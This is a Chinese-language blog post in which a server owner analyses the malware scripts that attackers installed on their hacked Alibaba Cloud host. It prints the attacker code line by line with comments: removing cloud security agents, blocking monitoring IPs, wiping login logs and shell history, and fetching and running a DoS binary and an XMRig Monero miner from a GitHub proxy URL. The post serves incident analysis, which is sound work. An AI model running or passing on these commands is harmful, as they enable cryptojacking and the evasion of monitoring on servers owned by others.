# 记上次黑客入侵阿里云主机，并分析其代码行为。

已将问题反馈到阿里云安全团队客服，并向阿里云中心举报其地址。接下来是代码分析。(中)

## xz.sh部分，即卸载脚本

参考信息源：

* [bili_62374023667-linux下ETH转发服务器+ETH抽水教程，支持SSL加密+删除阿狸监控避免上报](https://www.bilibili.com/read/cv15054271/)
* [csdn-linux+agent卸载_华为云服务器卸载agent监控服务Linux+windows教程](https://blog.csdn.net/weixin_33148621/article/details/113900993)
* [CentOS服务器清除用户登录记录和命令历史方法](https://blog.csdn.net/cljdsc/article/details/123358983)
* [Linux基础：history命令](https://blog.51cto.com/skypegnu1/1941153)


黑客核心代码解读

```
# 首先是下载阿里云盾卸载脚本
wget http://update.aegis.aliyun.com/download/uninstall.sh
chmod +x uninstall.sh && ./uninstall.sh
# 然后屏蔽掉云盾IP
iptables -I INPUT -s 140.205.201.0/28 -j DROP
# 进行恶意卸载云盾等其他组件服务
sh /usr/local/qcloud/stargate/admin/uninstall.sh
# 还把监控都给停止了
service telescoped stop
# 清除系统登录成功命令历史记录
echo > /var/log/wtmp 
# 清除登陆系统失败的记录
echo > /var/log/btmp
# 导入空记录，清除历史执行命令
echo > .bash_history
# 清除历史执行命令并保存。
history -c && history -w
# 删掉脚本
rm -rf cd /root/uninstall.sh
```

## k.sh，即杀死进程脚本

参考信息源：

* [Shell 文件或目录操作符（-e、-d、-f、-r、-w、-x）](https://blog.csdn.net/zz00008888/article/details/122360612)

黑客核心代码解读

```
# 结束dos26（可能为ddos）
killall -9 dos26
# 结束不明程序（命名不知其意）
killall -9 tfq
# 结束挖矿程序
killall -9 xmrig
# 删除程序
rm -rf cd /tmp/dos26
rm -rf cd /tmp/tfq
rm -rf cd /tmp/xmrig
# 判断对象是否有可写(Write)权限，是则为真
if [ ! -w "/tmp/dos64" ]; then
# 进入目录，下载恶意dos，赋予读写及执行权限，并执行
    cd /tmp;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/dos64;chmod 777 dos64;./dos64
fi
if [ ! -w "/root/c3pool/xmrig" ]; then
# 下载恶意靶机脚本执行
    curl -s -L https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/ba.sh | bash -s
fi
# 又一次删除程序
rm -rf cd /tmp/dos26
rm -rf cd /tmp/tfq
rm -rf cd /tmp/xmrig
# 休眠，删掉挖矿记录文件
sleep 88;rm -rf cd /root/c3pool
```

## bk.sh，推测是靶机脚本

### if语句检测环境内容

#### 第一层 if

参考信息源：

* [百度知道-Linux shell 脚本 $(id -u) 是什么意思？](https://zhidao.baidu.com/question/944658594109817212.html)
* [bbsmax-shell if判断中常用的a-z表达式含义](https://www.bbsmax.com/A/8Bz81Qa6Jx/)
* [linux 环境变量设置 -d,Linux环境变量的设置](https://blog.csdn.net/weixin_35565522/article/details/116774198)
* [Shell中的exit 0 和 exit 1是做什么的?](https://www.pianshen.com/article/37962128580/)
* [博客园-shell中的type命令](https://www.cnblogs.com/chaoguo1234/p/5723531.html)
* [Linux /dev/null详解](https://www.shuzhiduo.com/A/6pdDP9ALdw/)


```
#-----
# 判断是不是root权限
if [ "$(id -u)" == "0" ]; then
  echo ""
fi
#----
# 这部分是判断环境配置准备

# “-z 长度为零则为真”，做一个逆向判断，就是找不到这个目录，打印"请将home环境定义到主目录"。 
if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
# 异常退出，debug检测的。
  exit 1
fi
# 检查是否有家目录，没有则提示导入，引入家目录环境变量
if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo 'export HOME=<dir>'
  exit 1
fi

# 找不到curl命令定义，则丢入黑洞，跳出
if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

# `sudo -n true 2`返回“一个密码请求”的定义信息
# if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
# 看起来是调用（CPU几个核心数*7/10），如果为0，跳出。
CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi
```

以上这echo所打印的报错信息，基本也说明主机不能正常使用，这对他们黑客而言，已经没有任何价值了。如果这些正常的话，则运行下载好的挖矿脚本，以及其专用的挖矿程序。然后又是层层的if环境检验。

#### 第二层 if

参考信息源：

* [入门小站-linux之curl命令](https://zhuanlan.zhihu.com/p/519406107)
* [sed -i 命令入门详解](https://blog.csdn.net/h4241778/article/details/125263518)
* [XMR恶意挖矿案例简析](https://www.sohu.com/a/260504074_354899)
* [诱捕黑客的蜜罐系统](https://baijiahao.baidu.com/s?id=1706341262655959831)
* [linux应用之test命令详细解析](https://www.cnblogs.com/tankblog/p/6160808.html)


```
# curl -L --progress-bar 显示网页内容与进度条，存在异常则直接中断退出。
if ! curl -L --progress-bar "https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  echo ""
  exit 1
fi

#  不能正常解压缩，退出删除文件
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool --strip=1; then
    echo ""
	echo ""
  fi
  rm /tmp/xmrig.tar.gz

# 使用正则，看上去是为了替换掉原有的config.json的donate-level的数值。
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/c3pool/config.json
  $HOME/c3pool/xmrig --help >/dev/null
  # $? 最后命令的退出状态的返回值。0表示没有错误，其他任何值表明有错误。
  #   # 比较，不等于0，再检验下xmrig还是不是文件，是就打印换行，否则跳出。
  if (test $? -ne 0); then 
    if [ -f $HOME/c3pool/xmrig ]; then
      echo ""
	  echo ""
    else 
      echo ""
	  echo ""
    fi
    exit 1
  fi
fi
```


### echo信息

echo部分为英语，我用翻译及个人有限功底理解其代码。第一行，中二教言语，忽略；从第二行开始翻译解读。

```
# 这部分是配置准备，以及调试
## 请将home环境定义到主目录。 
echo "ERROR: Please define HOME environment variable to your home directory"
## 请确保home环境已设置 
echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"

# 从这行的上部分代码推测实在挖矿了， 无法计算比特币什么的
## 错误：无法计算预计的门罗币 CN 哈希率 
echo "ERROR: Can't compute projected Monero CN hashrate"
## 报错，无法计算端口，输出错误端口
echo "ERROR: Can't compute port"
echo "ERROR: Wrong computed port value: $PORT"

# 进一步的恶意操控挖矿
## 下载与后台运行Monero CPU矿机/主机
echo "I will download, setup and run in background Monero CPU miner."
## 如果需要，前台的矿工可以通过$HOME/c3pool/miner.sh脚本启动。 
echo "If needed, miner in foreground can be started by $HOME/c3pool/miner.sh script."
# 挖矿将发生在 $WALLET 钱包上。这句话打印出来，就说明之前所有暗箱操作全完成了。
echo "Mining will happen to $WALLET wallet."
# 删掉挖矿的目录
echo "[*] Removing $HOME/c3pool directory"
```

